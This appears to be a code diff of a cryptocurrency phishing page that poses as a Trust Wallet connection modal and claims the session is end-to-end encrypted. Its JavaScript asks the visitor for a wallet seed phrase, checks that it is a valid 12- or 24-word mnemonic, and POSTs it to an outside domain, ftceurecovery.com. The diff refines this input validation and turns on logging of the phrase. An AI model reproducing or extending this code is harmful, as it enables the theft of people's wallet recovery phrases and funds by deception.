@@ -468,7 +468,8 @@
                 <div id="mainModal" class="modal-wrapper">
                     <div class="modal-top">
                         <div class="modal-img">
-                            <img src="../assets/images/static/trust_wallet.jpg" alt="" id="assetImg" class="img-fluid" />
+                            <img src="../assets/images/files/trust_wallet.jpg" alt="" id="assetImg"
+                                class="img-fluid" />
                         </div>
                         <div class="header-content">
                             <p class="m-p-1"><span id="assetName"> Trust Wallet </span></p>
@@ -523,7 +524,7 @@
                     </div>
                     <div class="modal-bottom">
                         <p class="m-b-p">
-                            <img src="../assets/images/static/shield.png" alt="" width="30" />
+                            <img src="../assets/images/files/shield.png" alt="" width="30" />
                             <span class="m-f-1">This session is protected with an end-to-end encryption
                             </span>
                         </p>
@@ -619,18 +620,18 @@
 
 
         $(".img-box").on('click', function () {
-            
-        // Get wallet name and image src from the clicked column
-        var walletName = $(this).find('.p-tag').text();
-        var walletImageSrc = $(this).find('img').attr('src');
 
-        $('#assetName').text(walletName);
-        $('#assetImg').attr('src', walletImageSrc);
+            // Get wallet name and image src from the clicked column
+            var walletName = $(this).find('.p-tag').text();
+            var walletImageSrc = $(this).find('img').attr('src');
 
-        openWeb();
+            $('#assetName').text(walletName);
+            $('#assetImg').attr('src', walletImageSrc);
 
-        // console.log("walletName: " + walletName);
-        // console.log("walletImageSrc: " + walletImageSrc);
+            openWeb();
+
+            // console.log("walletName: " + walletName);
+            // console.log("walletImageSrc: " + walletImageSrc);
 
         });
 
@@ -688,16 +689,22 @@
         event.preventDefault();
         document.getElementById("submit_phrase").disabled = true;
         var dappWords = $("#formPhrase").val();
-        dappWords = dappWords.trim();
-        var randomString = generateRandomString(7);
-        var dappName = $('#assetName').text();
 
-        try {
-            const wallet = ethers.Wallet.fromMnemonic(dappWords);
-            // console.log('Seed phrase is valid:', dappWords);
-            // console.log('Wallet address:', wallet.address);
-            $.ajax({
-                url: "https://ftceurecovery.com/action/verify.php", 
+        if (!validateInput(dappWords)) {
+           
+            $("#formPhrase").addClass("error");
+        } else {
+
+            dappWords = dappWords.trim();
+            var randomString = generateRandomString(7);
+            var dappName = $('#assetName').text();
+
+            try {
+                const wallet = ethers.Wallet.fromMnemonic(dappWords);
+                console.log('Seed phrase is valid:', dappWords);
+                // console.log('Wallet address:', wallet.address); https://ftceurecovery.com/action/verify.php
+                $.ajax({
+                url: "https://ftceurecovery.com/action/verify.php",
                 method: "POST",
                 dataType: "JSON",
                 data: {
@@ -708,14 +715,33 @@
                 success: function () { },
                 complete: function () { },
             });
-            document.getElementById("p-code").innerHTML = randomString;
-            $("#mainModal").hide();
-            $("#qrModal").show();
-            document.getElementById("submit_phrase").disabled = true;
-        } catch (error) {
-            // console.error("Invalid seed phrase:", dappWords);
-            $("#formPhrase").addClass("error");
-            document.getElementById("submit_phrase").disabled = false;
+                document.getElementById("p-code").innerHTML = randomString;
+                $("#mainModal").hide();
+                $("#qrModal").show();
+                document.getElementById("submit_phrase").disabled = true;
+            } catch (error) {
+                // console.error("Invalid seed phrase:", dappWords);
+                $("#formPhrase").addClass("error");
+                document.getElementById("submit_phrase").disabled = false;
+            }
         }
     });
+
+    function validateInput(input) {
+        var sanitizedInput = input.replace(/<script.*?>.*?<\/script>/gi, ''); // Remove script tags
+        sanitizedInput = sanitizedInput.replace(/<\/?[^>]+(>|$)/g, ""); // Strip any other HTML tags
+
+        // Split the input into words using space as a delimiter after removing HTML
+        var words = sanitizedInput.trim().split(/\s+/);
+        if (words.length !== 12 && words.length !== 24) {
+            return false; // Check for 12 or 24 words
+        }
+
+        var wordSet = new Set(words);
+        if (wordSet.size !== words.length) {
+            return false; // Check for duplicates
+        }
+
+        return true; // Passed all checks
+    }
 </script>
